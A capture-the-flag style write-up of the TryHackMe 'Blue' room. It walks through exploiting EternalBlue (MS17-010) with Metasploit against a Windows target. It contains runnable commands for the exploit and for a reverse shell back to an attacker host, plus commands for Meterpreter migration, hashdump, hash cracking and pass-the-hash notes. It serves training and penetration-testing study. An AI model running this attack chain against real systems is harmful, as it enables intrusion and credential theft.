# Blue (EternalBlue — MS17-010)

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Network Exploitation / Windows  
**Status:** ✅ Completed  
**Techniques:** Nmap Vuln Scan · EternalBlue (MS17-010) · Meterpreter · Password Hash Dumping · Pass-the-Hash  

---

## Overview

Blue is a Windows exploitation room built around EternalBlue (MS17-010) — one of the most significant vulnerabilities in recent history, originally developed by the NSA and leaked by the Shadow Brokers. It was used in the WannaCry and NotPetya ransomware attacks of 2017.

The room covers vulnerability identification, exploitation via Metasploit, and post-exploitation including shell stabilisation, password hash dumping, and cracking.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning + vulnerability detection |
| Metasploit (`msfconsole`) | EternalBlue exploitation |
| Meterpreter | Post-exploitation framework |
| `hashdump` | Dumping Windows password hashes |
| `john` / `hashcat` | Offline hash cracking |

---

## Phase 1 — Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

Key open ports:

| Port | Service | Notes |
|---|---|---|
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | SMB over NetBIOS |
| 445 | SMB | Target service for MS17-010 |
| 3389 | RDP | Remote Desktop |

### Vulnerability Scan

```bash
nmap --script vuln -p 445 <TARGET_IP>
```

Output confirms:

```
Host is VULNERABLE to MS17-010
```

The NSE script `smb-vuln-ms17-010` identifies the target as unpatched and exploitable.

---

## Phase 2 — Exploitation (EternalBlue)

### Metasploit Setup

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
set LPORT 4444
set payload windows/x64/shell/reverse_tcp
run
```

**Result:** Initial shell obtained as `NT AUTHORITY\SYSTEM` — the highest privilege level on Windows, equivalent to root.

### Shell Stabilisation

The initial shell is unstable. It's upgraded to Meterpreter for better post-exploitation capability:

```bash
# Background the current session
background

# Use shell upgrade module
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

Switch to the new Meterpreter session:

```bash
sessions -i 2
```

### Process Migration

Meterpreter is migrated to a stable process to avoid shell death if the exploited process crashes:

```bash
ps                          # list running processes
migrate <PID>               # migrate to a stable process (e.g. spoolsv.exe)
```

---

## Phase 3 — Post-Exploitation

### Verify Privileges

```bash
getuid
# Output: NT AUTHORITY\SYSTEM
```

Full SYSTEM privileges confirmed.

### Password Hash Dumping

```bash
hashdump
```

Output format:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
Jon:<RID>:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

The LM hash (`aad3b435...`) is the empty hash — Windows Vista+ disables LM hashes by default. The NT hash is what matters.

### Cracking the Hash

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Or with hashcat:

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:** User `Jon`'s password recovered from the NT hash.

---

## Attack Chain Summary

```
Nmap vuln scan → MS17-010 confirmed on port 445
    │
    ▼
Metasploit EternalBlue → NT AUTHORITY\SYSTEM shell
    │
    ▼
Shell → Meterpreter upgrade
    │
    ▼
Process migration → Stable session
    │
    ▼
hashdump → NT hashes extracted
    │
    ▼
John/Hashcat → Plaintext passwords ✅
```

---

## Key Takeaways

**1. MS17-010 still appears in real engagements**
Unpatched Windows 7 / Server 2008 R2 machines running SMBv1 are still found in enterprise networks, especially in legacy OT/ICS environments and poorly maintained infrastructure.

**2. EternalBlue gives SYSTEM immediately**
No privilege escalation required — the exploit lands directly as SYSTEM. This is why unpatched SMB is a critical finding in every VAPT report.

**3. NT hashes can be used without cracking**
Pass-the-Hash with the NT hash directly works against many Windows services (SMB, WinRM, RDP with restricted admin). Cracking is optional — lateral movement is possible with the hash alone.

**4. Always migrate processes in Meterpreter**
Staying in the exploited process is unstable. Migrating to `spoolsv.exe`, `svchost.exe`, or `explorer.exe` keeps the session alive.

---

## Real-World VAPT Relevance

| Step | Real Engagement Equivalent |
|---|---|
| Nmap vuln scan | Standard service vulnerability identification |
| MS17-010 exploitation | Critical finding — immediate SYSTEM on unpatched hosts |
| hashdump | Credential harvesting — reported in VAPT findings |
| Hash cracking | Password audit — weak passwords flagged in reports |
| Pass-the-Hash potential | Lateral movement vector in internal assessments |

---

## Why This Matters Beyond the CVE

EternalBlue is more than a single CVE — understanding it teaches:
- How SMBv1 protocol weaknesses are abused
- Why network segmentation limits blast radius
- How a single unpatched host can lead to full domain compromise via lateral movement
- Why patch management is always a critical recommendation in VAPT reports

---

## References

- [MS17-010 — Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [EternalBlue Technical Analysis](https://research.checkpoint.com/2017/eternalblue-everything-know/)
- [GTFOBins](https://gtfobins.github.io)
- [TryHackMe — Blue](https://tryhackme.com/room/blue)
